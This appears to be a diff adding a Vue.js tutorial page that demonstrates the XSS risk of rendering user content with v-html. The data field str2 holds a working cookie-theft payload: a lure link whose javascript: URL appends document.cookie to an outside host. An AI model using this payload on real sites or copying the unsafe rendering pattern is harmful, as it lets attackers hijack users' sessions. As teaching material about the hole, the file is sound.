@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="../js/vue.js"></script>
+</head>
+
+<body>
+    <div id="root">
+        <h3 v-html='str'></h3>
+        <h3 v-html='str2'></h3>
+        <a href=""></a>
+    </div>
+    <script>
+
+        var vm = new Vue({
+            el: '#root',
+            data: {
+                str: 'caicai',
+                // live server在打开的网页里随便加几条cookie
+                // 点击链接 把cookies参数以query的形式传给链接所指的服务器
+                // 如果评论里写上str2里的内容，而页面以v-html的方式获取到str2，那么就会有问题
+                str2: '<a href=javascript:location.href="www.baidu.com"+document.cookie>我找到你想要的资源了！快来！</a>'
+            },
+            methods: {
+
+            },
+            computed: {
+
+            }
+        })
+    </script>
+</body>
+
+</html>
